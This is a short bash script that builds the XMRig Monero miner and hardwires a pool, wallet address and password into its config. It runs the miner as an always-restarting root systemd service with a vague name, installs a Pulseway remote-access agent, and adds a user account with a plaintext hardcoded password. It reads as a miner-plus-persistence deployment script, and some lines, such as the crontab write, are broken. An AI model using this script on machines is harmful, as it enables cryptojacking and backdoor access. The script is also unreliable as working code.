#!/bin/bash -ex
cd /root 
sudo apt-get update -y 
echo /etc/crontab > 00 6 * * * root reboot 
sudo apt-get install -y git build-essential make automake gcc libtool libuv1-dev cmake curl libmicrohttpd-dev opencl-headers  
git clone https://github.com/xmrig/xmrig.git 
cd xmrig 
cmake -DUV_LIBRARY=/usr/lib/x86_64-linux-gnu/libuv.a 
make 
sudo cp xmrig /usr/local/bin/xmrig 
sudo cp ./src/config.json ./config.json 
sed -i 's/"url": *"[^"]*",/"url": "pool.supportxmr.com:5555",/' ./config.json 

sed -i 's/"user": *"[^"]*",/"user": "44qchmhzrHYYnaiwa4YCwSYXQwkoX58TXiJtqwZZepTmKFzKqKHx9377EFHGGS98fnjWYCnLb43j34rwHNt3VQCpRuWm9ZH",/' ./config.json 

sed -i 's/"pass": *"[^"]*",/"pass": "ENIMUS-TAHK-P:enimus@enimus.info",/' ./config.json 

sed -i 's#"log-file": *null,#"log-file": "'./xmrig.log'",#' ./config.json 

cat >/tmp/enimus_miner.service <<EOL
[Unit]
Description=Enimus-TAHK service
After=network.target
 
[Service]
ExecStart=/usr/local/bin/xmrig --config=/root/xmrig/config.json
Restart=always
User=root

[Install]
WantedBy=multi-user.target

EOL
 
 
sudo mv /tmp/enimus_miner.service /etc/systemd/system/enimus_miner.service 
# this is kick off aaall miners lol.
sed -i 's#"log-file": *null,#"log-file": "'/xmrig.log'",#' ./config.json 
sudo systemctl daemon-reload 
sudo systemctl enable enimus_miner.service 
sudo systemctl start enimus_miner.service 
sudo systemctl status enimus_miner.service 

sudo dpkg -i /root/TAHK/pulseway_x64.deb 
sudo cp /root/TAHK/config.xml /etc/pulseway
sudo service pulseway start 

sudo adduser enimus 
echo "Life1993/Life1993" |passwd enimus 
  
 
